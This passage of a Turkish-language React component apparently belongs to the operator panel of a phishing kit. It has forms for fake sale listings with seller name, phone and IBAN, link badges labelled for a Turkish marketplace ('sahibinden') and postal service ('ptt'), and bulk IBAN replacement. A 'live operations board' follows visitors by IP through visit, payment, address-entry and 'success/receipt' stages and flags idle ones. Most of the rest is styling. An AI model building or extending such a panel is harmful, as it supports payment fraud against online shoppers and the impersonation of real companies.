                            <h2>{ilanForm.docId ? 'İlanı Düzenle' : 'Yeni İlan Oluştur'}</h2>
                            <button className="close-btn" onClick={() => setIsIlanModalOpen(false)}>×</button>
                        </div>
                        <form onSubmit={handleIlanSubmit}>
                            <div className="form-grid">
                                <div className="form-group"><label>İlan Başlığı</label><input type="text" required value={ilanForm.urunAdi} onChange={e => {
                                    const val = e.target.value;
                                    setIlanForm({ ...ilanForm, urunAdi: val, linkUzantisi: ilanForm.docId ? ilanForm.linkUzantisi : slugify(val) });
                                }} /></div>
                                <div className="form-group"><label>Link Uzantısı</label><input type="text" value={ilanForm.linkUzantisi} onChange={e => setIlanForm({ ...ilanForm, linkUzantisi: slugify(e.target.value) })} /></div>
                                <div className="form-group"><label>Satıcı Adı Soyadı</label><input type="text" required value={ilanForm.saticiAdi} onChange={e => setIlanForm({ ...ilanForm, saticiAdi: e.target.value })} /></div>
                                <div className="form-group"><label>Satıcı Telefon</label><input type="text" required value={ilanForm.saticiTel} onChange={e => setIlanForm({ ...ilanForm, saticiTel: e.target.value })} /></div>
                                <div className="form-group"><label>Şehir / İlçe</label><input type="text" required value={ilanForm.sehir} onChange={e => setIlanForm({ ...ilanForm, sehir: e.target.value })} /></div>
                                <div className="form-group"><label>Fiyat (TL)</label><input type="number" required value={ilanForm.fiyat} onChange={e => setIlanForm({ ...ilanForm, fiyat: e.target.value })} /></div>
                                <div className="form-group"><label>IBAN</label><input type="text" required value={ilanForm.iban} onChange={e => setIlanForm({ ...ilanForm, iban: e.target.value })} /></div>
                                <div className="form-group"><label>Kategori Ağacı</label><input type="text" value={ilanForm.kategoriAgaci} onChange={e => setIlanForm({ ...ilanForm, kategoriAgaci: e.target.value })} /></div>
                            </div>
                            <div className="form-group">
                                <label>Ürün Açıklaması</label>
                                <textarea rows={3} value={ilanForm.urunAciklamasi} onChange={e => setIlanForm({ ...ilanForm, urunAciklamasi: e.target.value })}></textarea>
                            </div>
                            <div className="form-group">
                                <label>İlan Resim URL (Virgülle ayırın veya bir tane girin)</label>
                                <input type="text" placeholder="https://i.ibb.co/..." value={ilanForm.anaResim} onChange={e => setIlanForm({ ...ilanForm, anaResim: e.target.value, resimler: [e.target.value] })} />
                            </div>
                            <button type="submit" className="btn-primary w-full">Kaydet</button>
                        </form>
                    </div>
                </div>
            )}

            {isBulkModalOpen && (
                <div className="modal-overlay" onClick={() => setIsBulkModalOpen(false)}>
                    <div className="modal-content sm" onClick={e => e.stopPropagation()}>
                        <h2>Toplu Bilgi Güncelleme</h2>
                        <p style={{ fontSize: '12px', color: 'var(--text-muted)', marginBottom: '15px' }}>Seçili {selectedAdIds.length} ilan için bilgileri güncelleyin. Boş bırakılan alanlar değişmez.</p>
                        <div className="form-group"><label>Yeni Satıcı Adı</label><input type="text" value={bulkForm.saticiAdi} onChange={e => setBulkForm({ ...bulkForm, saticiAdi: e.target.value })} /></div>
                        <div className="form-group"><label>Yeni Satıcı Tel</label><input type="text" value={bulkForm.saticiTel} onChange={e => setBulkForm({ ...bulkForm, saticiTel: e.target.value })} /></div>
                        <div className="form-group"><label>Yeni IBAN</label><input type="text" value={bulkForm.iban} onChange={e => setBulkForm({ ...bulkForm, iban: e.target.value })} /></div>
                        <button className="btn-primary w-full" onClick={handleBulkUpdate}>Seçili İlanlara Uygula</button>
                    </div>
                </div>
            )}

            {isConfirmModalOpen && (
                <div className="modal-overlay">
                    <div className="modal-content confirm">
                        <h3>İşlem Onayı</h3>
                        <p>{confirmConfig.message}</p>
                        <div className="confirm-actions">
                            <button className="btn-outline" onClick={() => setIsConfirmModalOpen(false)}>İptal</button>
                            <button className="btn-danger" onClick={() => { confirmConfig.onConfirm(); setIsConfirmModalOpen(false); }}>Onayla</button>
                        </div>
                    </div>
                </div>
            )}

            {isKanbanOpen && (
                <div className="kanban-overlay" onClick={() => setIsKanbanOpen(false)}>
                    <div className="kanban-board" onClick={e => e.stopPropagation()}>
                        <div className="kanban-header">
                            <h2>Canlı Operasyon Panosu</h2>
                            <button onClick={() => setIsKanbanOpen(false)}>Kapat</button>
                        </div>
                        <div className="kanban-columns">
                            {[
                                { id: 'visit', label: 'Vitrin / Ziyaret', icon: '👀' },
                                { id: 'payment', label: 'Ödeme Adımı', icon: '💳' },
                                { id: 'address', label: 'Adres Girişi', icon: '📍' },
                                { id: 'success', label: 'Başarılı / Dekont', icon: '✅' }
                            ].map(col => (
                                <div key={col.id} className="kanban-col">
                                    <div className="col-header">
                                        <span>{col.icon} {col.label}</span>
                                        <span className="count">{(kanban as any)[col.id].length}</span>
                                    </div>
                                    <div className="col-cards">
                                        {(kanban as any)[col.id].map((card: any) => (
                                            <div key={card.id} className={`k-card ${card.isIdle ? 'idle' : ''} ${col.id}`}>
                                                {card.isIdle && <div className="idle-tag">⚠️ 3 DK DURGUN</div>}
                                                <div className="k-ip">{card.ip}</div>
                                                <div className="k-title">{card.ilanBasligi}</div>
                                                <div className="k-action">{card.aksiyon}</div>
                                                <div className="k-device">{card.cihaz || card.os}</div>
                                                <div className="k-time">{card.saat}</div>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>
                </div>
            )}

            {isTicketReadModalOpen && viewingTicket && (
                <div className="modal-overlay" onClick={() => setIsTicketReadModalOpen(false)}>
                    <div className="modal-content sm" onClick={e => e.stopPropagation()}>
                        <h2>Talep Detayı</h2>
                        <div className="ticket-view-box">
                            <label>SİZİN MESAJINIZ</label>
                            <div className="msg-bubble user">{viewingTicket.mesaj}</div>
                            <label>YÖNETİCİ YANITI</label>
                            <div className="msg-bubble admin">{viewingTicket.yanit || 'Henüz yanıtlanmadı...'}</div>
                        </div>
                        <button className="btn-outline w-full" onClick={() => setIsTicketReadModalOpen(false)}>Kapat</button>
                    </div>
                </div>
            )}

            {/* Toasts */}
            <div id="toast-container">
                {toasts.map(t => (
                    <div key={t.id} className={`toast ${t.type} show`}>
                        <span className="toast-title">{t.title}</span>
                        <span>{t.message}</span>
                    </div>
                ))}
            </div>

            <style jsx global>{`
                :root {
                    --bg-panel: #09090b;
                    --bg-card: #18181b;
                    --border-color: rgba(255,255,255,0.08);
                    --text-main: #fafafa;
                    --text-muted: #a1a1aa;
                    --accent: #3b82f6;
                    --danger: #ef4444;
                    --success: #10b981;
                    --warning: #f59e0b;
                }
                [data-theme='light'] {
                    --bg-panel: #f4f4f5;
                    --bg-card: #ffffff;
                    --border-color: rgba(0,0,0,0.08);
                    --text-main: #09090b;
                    --text-muted: #71717a;
                }
                * { box-sizing: border-box; margin: 0; padding: 0; }
                body { background: var(--bg-panel); color: var(--text-main); transition: all 0.3s ease; overflow-x: hidden; }
                
                .panel-container { min-height: 100vh; padding: 20px; max-width: 1400px; margin: 0 auto; position: relative; }
                
                .loading-screen { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
                .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
                @keyframes spin { to { transform: rotate(360deg); } }

                .lockdown-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999999; display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
                .lockdown-overlay.active { display: flex; }
                .lockdown-card { background: var(--bg-card); border: 2px solid var(--danger); padding: 40px; border-radius: 24px; text-align: center; max-width: 400px; animation: shake 0.5s ease-in-out; }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
                .lockdown-card h2 { margin: 20px 0 10px; color: var(--danger); font-weight: 800; }
                .lockdown-card p { color: var(--text-muted); font-size: 14px; line-height: 1.6; }

                .soft-ban-banner { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); padding: 12px 20px; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; color: #ef4444; font-size: 14px; }
                .anons-banner { background: #3b82f6; padding: 8px 20px; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; color: #fff; font-weight: 700; font-size: 13px; overflow: hidden; }
                .anons-badge { background: #fff; color: #3b82f6; padding: 2px 8px; border-radius: 6px; font-size: 10px; font-weight: 900; flex-shrink: 0; }

                .panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
                .logo-section { display: flex; align-items: center; gap: 15px; }
                .logo-icon { width: 40px; height: 40px; background: var(--text-main); color: var(--bg-panel); display: flex; align-items: center; justify-content: center; border-radius: 10px; font-weight: 800; font-size: 20px; }
                .logo-section h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.5px; }
                .logo-section p { font-size: 12px; color: var(--text-muted); font-weight: 600; }
                
                .header-actions { display: flex; align-items: center; gap: 15px; }
                .theme-toggle-btn { background: var(--bg-card); border: 1px solid var(--border-color); width: 40px; height: 40px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 18px; }
                .logout-btn { background: var(--bg-card); border: 1px solid var(--border-color); color: var(--text-main); padding: 8px 16px; border-radius: 10px; font-size: 13px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all 0.2s; }
                .logout-btn:hover { background: var(--danger); border-color: var(--danger); color: #fff; }

                .stats-hud { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-bottom: 30px; }
                .stat-card { background: var(--bg-card); border: 1px solid var(--border-color); padding: 24px; border-radius: 16px; display: flex; align-items: center; gap: 20px; cursor: pointer; transition: transform 0.2s; }
                .stat-card:hover { transform: translateY(-3px); border-color: var(--accent); }
                .stat-icon { width: 50px; height: 50px; border-radius: 12px; display: flex; align-items: center; justify-content: center; }
                .stat-label { font-size: 12px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; display: block; margin-bottom: 4px; }
                .stat-value { font-size: 24px; font-weight: 800; }

                .main-content { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 20px; padding: 25px; min-height: 500px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
                .search-bar { position: relative; margin-bottom: 25px; display: flex; align-items: center; }
                .search-bar svg { position: absolute; left: 15px; }
                .search-bar input { width: 100%; background: var(--bg-panel); border: 1px solid var(--border-color); padding: 14px 20px 14px 45px; border-radius: 12px; color: var(--text-main); font-size: 14px; font-weight: 600; outline: none; transition: border-color 0.2s; }
                .search-bar input:focus { border-color: var(--accent); }

                .tab-nav { display: flex; gap: 8px; margin-bottom: 25px; overflow-x: auto; padding-bottom: 10px; }
                .tab-btn { background: transparent; border: 1px solid transparent; color: var(--text-muted); padding: 10px 18px; font-size: 13px; font-weight: 700; cursor: pointer; border-radius: 10px; transition: all 0.2s; white-space: nowrap; }
                .tab-btn:hover { background: rgba(255,255,255,0.05); }
                .tab-btn.active { background: rgba(59, 130, 246, 0.1); color: var(--accent); border-color: rgba(59, 130, 246, 0.2); }

                .view-actions { display: flex; gap: 12px; margin-bottom: 20px; }
                .btn-primary { background: var(--accent); color: #fff; border: none; padding: 12px 24px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3); }
                .btn-outline { background: transparent; border: 1px solid var(--border-color); color: var(--text-main); padding: 12px 24px; border-radius: 10px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; }
                .btn-outline.active { border-color: var(--accent); color: var(--accent); background: rgba(59, 130, 246, 0.05); }

                .table-wrapper { overflow-x: auto; border-radius: 12px; border: 1px solid var(--border-color); }
                table { width: 100%; border-collapse: collapse; min-width: 900px; }
                th { text-align: left; padding: 15px; font-size: 11px; text-transform: uppercase; font-weight: 900; color: var(--text-muted); background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border-color); }
                td { padding: 15px; font-size: 13px; border-bottom: 1px solid var(--border-color); vertical-align: middle; }
                .thumb-img { width: 45px; height: 45px; border-radius: 8px; object-fit: cover; background: var(--bg-panel); border: 1px solid var(--border-color); }
                
                .link-group { display: flex; gap: 5px; }
                .link-badge { padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 800; border: none; cursor: pointer; color: #fff; transition: opacity 0.2s; }
                .link-badge.sahibinden { background: #facc15; color: #000; }
                .link-badge.ptt { background: #ef4444; }
                .link-badge:hover { opacity: 0.8; }
                .locked-badge { font-size: 11px; color: var(--danger); font-weight: 800; background: rgba(239,68,68,0.1); padding: 4px 8px; border-radius: 6px; }

                .title-cell { display: flex; flex-direction: column; gap: 2px; }
                .title-cell strong { color: var(--text-main); font-size: 14px; }
                .title-cell small { color: var(--text-muted); font-size: 11px; font-family: monospace; }

                .status-badge { padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 900; }
                .status-badge.aktif { background: rgba(16, 185, 129, 0.1); color: #10b981; }
                .status-badge.pasif { background: rgba(239, 68, 68, 0.1); color: #ef4444; }

                .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
                .switch input { opacity: 0; width: 0; height: 0; }
                .slider { position: absolute; cursor: pointer; inset: 0; background-color: rgba(255,255,255,0.1); transition: .4s; border-radius: 20px; }
                .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 2px; bottom: 2px; background-color: white; transition: .4s; border-radius: 50%; }
                input:checked + .slider { background-color: var(--accent); }
                input:checked + .slider:before { transform: translateX(20px); }

                .row-actions { display: flex; gap: 8px; }
                .icon-btn { background: var(--bg-panel); border: 1px solid var(--border-color); width: 32px; height: 32px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 14px; transition: all 0.2s; }
                .icon-btn:hover { border-color: var(--accent); background: rgba(59, 130, 246, 0.1); }
                .icon-btn.danger:hover { border-color: var(--danger); background: rgba(239, 68, 68, 0.1); }

                /* Log Styles */
                .log-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
                .log-filters { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 5px; }
                .filter-btn { background: transparent; border: 1px solid var(--border-color); color: var(--text-muted); padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; }
                .filter-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(59, 130, 246, 0.05); }
                .btn-kanban { background: linear-gradient(135deg, #6366f1, #4f46e5); color: #fff; border: none; padding: 8px 16px; border-radius: 10px; font-weight: 700; font-size: 13px; cursor: pointer; display: flex; align-items: center; gap: 8px; }
                .log-badge { padding: 4px 8px; border-radius: 6px; font-size: 10px; font-weight: 900; }
                .log-badge.success { background: rgba(16, 185, 129, 0.1); color: #10b981; }
                .log-badge.danger { background: rgba(239, 68, 68, 0.1); color: #ef4444; }
                .log-badge.info { background: rgba(59, 130, 246, 0.1); color: #3b82f6; }
                .date-cell, .ip-cell { display: flex; flex-direction: column; gap: 2px; }
                .date-cell small, .ip-cell small { font-size: 10px; color: var(--text-muted); font-weight: 600; }
                .ip-cell code { font-family: monospace; font-weight: 800; color: var(--accent); }

                /* Sorgu Styles */
                .sorgu-hero { text-align: center; padding: 40px 0; background: linear-gradient(135deg, rgba(139, 92, 246, 0.05), rgba(79, 70, 229, 0.05)); border-radius: 20px; margin-bottom: 30px; border: 1px solid rgba(139, 92, 246, 0.1); }
                .sorgu-hero h2 { margin: 15px 0 5px; font-size: 24px; font-weight: 800; }
                .sorgu-bakim { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 15px; border-radius: 12px; text-align: center; font-weight: 800; margin-bottom: 20px; }
                .sorgu-form.disabled { opacity: 0.5; pointer-events: none; }
                .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
                .flex-2 { grid-column: span 2; }
                .input-row { display: flex; gap: 10px; }
                .form-group { display: flex; flex-direction: column; gap: 8px; }
                .form-group label { font-size: 12px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; }
                .form-group input, .form-group select, .form-group textarea { background: var(--bg-panel); border: 1px solid var(--border-color); padding: 12px 16px; border-radius: 10px; color: var(--text-main); font-size: 14px; font-weight: 600; outline: none; }
                .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: var(--accent); }

                /* Destek Styles */
                .destek-split { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
                .ticket-list { display: flex; flex-direction: column; gap: 12px; margin-top: 15px; }
                .ticket-card { background: var(--bg-panel); border: 1px solid var(--border-color); padding: 15px; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
                .ticket-card:hover { border-color: var(--accent); transform: translateX(5px); }
                .ticket-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
                .ticket-badge { font-size: 10px; font-weight: 800; padding: 4px 8px; border-radius: 6px; }
                .ticket-badge.Acik { background: rgba(239,68,68,0.1); color: #ef4444; }
                .ticket-badge.Yanitlandi { background: rgba(16,185,129,0.1); color: #10b981; }
                .ticket-card p { font-size: 13px; color: var(--text-muted); margin-bottom: 8px; }

                /* Ayarlar Styles */
                .ayarlar-view { max-width: 700px; }
                .ayarlar-header { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; }
                .ayarlar-info { color: var(--text-muted); font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
                .guide-box { background: rgba(59, 130, 246, 0.05); border: 1px solid rgba(59, 130, 246, 0.2); padding: 20px; border-radius: 12px; margin: 15px 0; }
                .guide-box strong { color: var(--accent); display: block; margin-bottom: 10px; }
                .guide-box ol { padding-left: 20px; }
                .guide-box li { margin-bottom: 8px; }

                /* Modal Styles */
                .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(5px); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px; }
                .modal-content { background: var(--bg-card); border: 1px solid var(--border-color); width: 100%; max-width: 650px; border-radius: 24px; padding: 30px; max-height: 90vh; overflow-y: auto; }
                .modal-content.sm { max-width: 450px; }
                .modal-content.confirm { max-width: 400px; text-align: center; }
                .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
                .close-btn { background: transparent; border: none; font-size: 30px; color: var(--text-muted); cursor: pointer; }
                .w-full { width: 100%; justify-content: center; margin-top: 15px; }
                .btn-danger { background: var(--danger); color: #fff; border: none; padding: 12px 24px; border-radius: 10px; font-weight: 700; cursor: pointer; }
                .confirm-actions { display: flex; gap: 10px; justify-content: center; margin-top: 25px; }

                /* Kanban Styles */
                .kanban-overlay { position: fixed; inset: 0; background: var(--bg-panel); z-index: 999999; overflow-y: auto; }
                .kanban-board { padding: 30px; min-height: 100vh; }
                .kanban-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--border-color); padding-bottom: 20px; }
                .kanban-columns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; }
                .kanban-col { background: rgba(255,255,255,0.02); border-radius: 20px; padding: 15px; min-height: 80vh; border: 1px dashed var(--border-color); }
                .col-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; font-weight: 800; font-size: 14px; }
                .col-header .count { background: var(--bg-card); padding: 2px 10px; border-radius: 20px; font-size: 12px; }
                .col-cards { display: flex; flex-direction: column; gap: 12px; }
                .k-card { background: var(--bg-card); border: 1px solid var(--border-color); padding: 15px; border-radius: 14px; position: relative; }
                .k-card.idle { border-color: var(--danger); border-width: 2px; }
                .idle-tag { position: absolute; top: -10px; right: 10px; background: var(--danger); color: #fff; font-size: 9px; font-weight: 900; padding: 2px 8px; border-radius: 20px; }
                .k-ip { font-family: monospace; font-weight: 900; color: var(--accent); margin-bottom: 5px; }
                .k-title { font-weight: 800; font-size: 13px; margin-bottom: 8px; }
                .k-action { font-size: 11px; font-weight: 700; color: var(--text-muted); background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 6px; display: inline-block; }
                .k-device { font-size: 10px; color: var(--text-muted); margin-top: 10px; }
                .k-time { font-size: 10px; position: absolute; bottom: 15px; right: 15px; opacity: 0.5; }

                /* Bubble Styles */
                .ticket-view-box { display: flex; flex-direction: column; gap: 15px; margin-bottom: 25px; }
                .msg-bubble { padding: 15px; border-radius: 12px; font-size: 14px; line-height: 1.6; }
                .msg-bubble.user { background: var(--bg-panel); border: 1px solid var(--border-color); }
                .msg-bubble.admin { background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); color: var(--text-main); }

                /* Empty States */
                .empty-state { text-align: center; padding: 60px 0; color: var(--text-muted); }
                .empty-state h3 { color: var(--text-main); margin: 15px 0 5px; }
                .empty-state.kilitli { color: var(--danger); }
                .empty-state.kilitli h3 { color: var(--danger); }

                /* Toast Animations */
                #toast-container { position: fixed; bottom: 30px; right: 30px; z-index: 999999; display: flex; flex-direction: column; gap: 15px; pointer-events: none; }
                .toast { min-width: 300px; background: var(--bg-card); border-left: 5px solid; padding: 16px 20px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); color: var(--text-main); font-weight: 600; font-size: 14px; animation: toastIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55) both; border: 1px solid var(--border-color); }
            `}</style>
        </div>
    );
}
